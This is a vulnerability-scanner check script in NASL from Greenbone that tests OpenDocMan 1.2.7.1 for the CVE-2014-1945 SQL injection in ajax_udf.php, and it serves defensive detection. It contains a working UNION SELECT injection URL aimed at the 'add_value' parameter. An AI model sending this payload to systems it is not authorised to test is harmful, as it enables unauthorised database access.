# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:opendocman:opendocman";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103913");
  script_cve_id("CVE-2014-1945");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("2023-07-26T05:05:09+0000");

  script_name("OpenDocMan 'ajax_udf.php' Multiple SQL Injection Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/65775");

  script_tag(name:"last_modification", value:"2023-07-26 05:05:09 +0000 (Wed, 26 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-03-11 15:18:54 +0100 (Tue, 11 Mar 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("secpod_opendocman_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("OpenDocMan/installed");

  script_tag(name:"impact", value:"An attacker can exploit these issues by manipulating the SQL query
logic to carry out unauthorized actions on the underlying database.");
  script_tag(name:"vuldetect", value:"Try to inject SQL code.");
  script_tag(name:"insight", value:"The vulnerability exists due to insufficient validation
of 'add_value' HTTP GET parameter in '/ajax_udf.php'.");
  script_tag(name:"solution", value:"Updates are available. Please see the references or vendor advisory
for more information.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"OpenDocMan is prone to multiple SQL-injection vulnerabilities because
it fails to sufficiently sanitize user-supplied data.");
  script_tag(name:"affected", value:"OpenDocMan 1.2.7.1 is vulnerable. Other versions may also be affected.");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

url = dir + '/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,0x53514c2d496e6a656374696f6e2d54657374,3,4,5,6,7,8,9';

if( http_vuln_check(port:port, url:url, pattern:"SQL-Injection-Test" ) )
{
  security_message(port:port);
  exit(0);

}

exit(0);

